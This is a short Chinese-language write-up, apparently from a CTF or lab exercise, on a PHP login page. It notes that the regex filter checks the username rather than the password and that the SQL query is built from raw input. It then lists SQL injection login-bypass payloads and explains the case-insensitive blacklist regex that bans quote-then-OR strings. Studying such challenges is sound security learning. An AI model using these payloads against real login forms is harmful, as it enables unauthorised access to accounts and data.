```
漏洞
1. $password_match = preg_match($pattern, $username);  怎麼是檢查 username ??
2. $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";  sql injection 典型範例



解題流程
1. username injection

' union select 1 from users;--
admin'--

2. password injection

' or 1=1 ;--

或
username = '/*
password = */ or 1=1--


note:
/.*['\"].*OR.*/i

/ regex / 參數

. : 除了換行以外的字元
* : 任意個數 (可以 0 個)
[] : 選一個出現
\" : 相當於 " 避免跟字串的上引號搞混，所以加 \

i : 不論大小寫

所以他會 ban 掉的字串為

(1) 任意字串'任意字串OR任意字串
(2) 任意字串"任意字串OR任意字串

OR Or oR or 都不行

ex:
' oR 1=1 --   
admin' or true# 
' or 1
'oR

```
